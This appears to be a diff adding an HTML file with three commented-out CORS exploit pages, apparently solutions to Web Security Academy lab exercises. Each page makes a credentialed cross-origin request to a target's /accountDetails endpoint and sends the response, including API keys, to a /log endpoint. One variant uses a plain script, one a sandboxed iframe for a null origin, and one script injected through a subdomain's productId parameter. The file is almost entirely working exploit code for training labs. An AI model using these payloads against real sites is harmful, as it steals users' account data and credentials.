@@ -1,0 +1,60 @@
+<!-- 
+<html>
+    <body>
+        <h1>You have been hacked !!!</h1>
+       <script>
+           var xhr = new XMLHttpRequest();
+           var url = "https://0a560086037b197e811c6103001100b1.web-security-academy.net";
+           xhr.onreadystatechange = function(){
+            if(xhr.readyState == XMLHttpRequest.DONE){
+                fetch("/log?key="+xhr.responseText)
+            }
+           }
+           xhr.open('GET',url+"/accountDetails",true)
+           xhr.withCredentials=true;
+           xhr.send(null);
+       </script>        
+    </body>
+</html> -->
+
+<!-- <html>
+    <body>
+        <h1>You have been hacked !!!</h1>
+        <iframe  
+         style="display:none" sandbox="allow-scripts" srcdoc=" 
+       <script>
+           var xhr = new XMLHttpRequest();
+           var url = 'https://0a4e00d20325b59d81877ba7007a005e.web-security-academy.net';
+           xhr.onreadystatechange = function(){
+            if(xhr.readyState == XMLHttpRequest.DONE){
+                fetch('/log?key='+xhr.responseText)
+            }
+           }
+           xhr.open('GET',url+'/accountDetails',true)
+           xhr.withCredentials=true;
+           xhr.send(null);
+        </script>
+        ">   </iframe>   
+    </body>
+</html> -->
+
+<!-- <html>
+    <body>
+        <script>
+            document.location="http://stock.0a17009b04c330c280d61c6100cf008e.web-security-academy.net/?productId=<script>
+            var xhr = new XMLHttpRequest();
+            var url = 'https://0a17009b04c330c280d61c6100cf008e.web-security-academy.net';
+            xhr.onreadystatechange = function(){
+                if(xhr.readyState == XMLHttpRequest.DONE){
+                    fetch('/log?key=' + xhr.responseText)
+                }
+            }
+            xhr.open('GET',url+'/accountDetails',true);
+            xhr.withCredentials=true;
+            xhr.send(null);</script>&storeId=1"
+        </script>
+    </body>
+</html> -->
+
+
+
